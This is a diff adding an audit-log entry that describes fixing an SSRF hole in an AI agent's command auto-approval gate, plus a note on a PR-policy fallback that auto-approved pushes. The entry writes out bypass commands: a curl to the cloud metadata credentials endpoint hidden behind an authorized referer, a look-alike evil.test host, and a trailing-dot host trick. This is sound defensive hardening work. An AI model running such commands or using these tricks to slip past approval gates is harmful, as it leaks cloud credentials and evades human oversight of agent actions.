@@ -1,5 +1,23 @@
 # Code Quality Audit
 
+## 2026-06-30 Close the Download Host-Gate SSRF
+
+The final hole in the download carve-out (the documented follow-up from #728). After all the segment/flag/output hardening, the **host gate** was still a substring match: `requestedHosts.contains { lowerCommand.contains(host) }`. The authorized host could appear anywhere in the command — an `-e` referer or `-H` header — while the *actual* fetched URL pointed elsewhere.
+
+| Before | After |
+| --- | --- |
+| `requestedHosts.contains { lowerCommand.contains(host) }`. Both of these **auto-approved** on "download from linkedin.com": `curl -e 'https://www.linkedin.com' --output x 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'` (a **cloud-metadata SSRF** landing cloud credentials in the workspace) and `curl --output x 'https://linkedin.com.evil.test/'` (a **look-alike host** — "linkedin.com" is a substring). | Extract the host of **every** `http(s)://` URL in the command and require each to equal a requested host or be a subdomain of one (`host == req || host.hasSuffix(".\(req)")`). The referer's host no longer satisfies the gate for a different target URL; the look-alike fails the equality/subdomain check. Host extraction is **fail-closed** — a URL `URLComponents` can't parse drops the whole command to human approval. |
+
+The adversarial review then caught a **bypass in the first cut**: `normalizedHostCandidate("www.")` stripped `www.` to the **empty string**, so a message like "download from www." yielded a requested host of `""` — and the gate's `host.hasSuffix(".\(requested)")` clause became `host.hasSuffix(".")`, wildcarding every *trailing-dot* host (`https://169.254.169.254./…`, which curl resolves to the metadata endpoint by stripping the FQDN-root dot). Closed by: a shared `normalizedHost` that strips the trailing dot **and** re-validates the post-`www.`-strip value is a non-empty dotted domain (used on both the requested and command-URL sides, so `169.254.169.254.` == `169.254.169.254`), an `!requested.isEmpty` guard in the gate, and switching the command side to the same `URL(string:).host` parser as the requested side (also fixing an IDN punycode/Unicode asymmetry that wrongly blocked legit IDN downloads).
+
+Verification — **non-vacuous**, proven by reverting only the source: `testAutoDoesNotAutoApproveDownloadSSRFToUnrequestedHostViaReferer`, `testAutoDoesNotAutoApproveDownloadToLookalikeHost`, and `testAutoDoesNotAutoApproveDownloadWhenRequestedHostNormalizesEmpty` all **fail** without their respective fixes (auto-approved). `testAutoApprovesDownloadFromSubdomainOfRequestedHost` and the existing legit download approves still pass. `swift test` 1912 green · native smoke clean.
+
+With this, the download carve-out has **no remaining documented follow-up** — and the auto-mode over-approval audit is complete across all three `userIntentMatches` paths (`hardDeny` decoding, the download carve-out, the PR policy).
+
+Residual risk:
+
+- `curl -L` follows redirects, so a server at a *requested* host that 30x-redirects to an internal host is an SSRF the static check cannot see (inherent — the policy only sees the initial URL); `hardDeny` and the destructive-risk default remain backstops, and the workspace-relative output bound still applies. Schemeless URLs (`curl example.com`) now fall to human approval (no `http(s)://` to validate) — the safe direction.
+
 ## 2026-06-30 Restrict the PR-Policy Default Fallback to Read-Only
 
 Third stop on the auto-mode over-approval audit (after `hardDeny` decoding and the download carve-out). `StaticSafetyPullRequestPolicy.intentMatches` falls back to `defaultAllowedToolNames` when no specific verb rule matches a PR-related request — and that fallback included **`git.push`** and **`git.pr.create`**. So any PR-*mentioning* request that didn't hit a specific verb auto-approved an outward-facing push/create with no human.
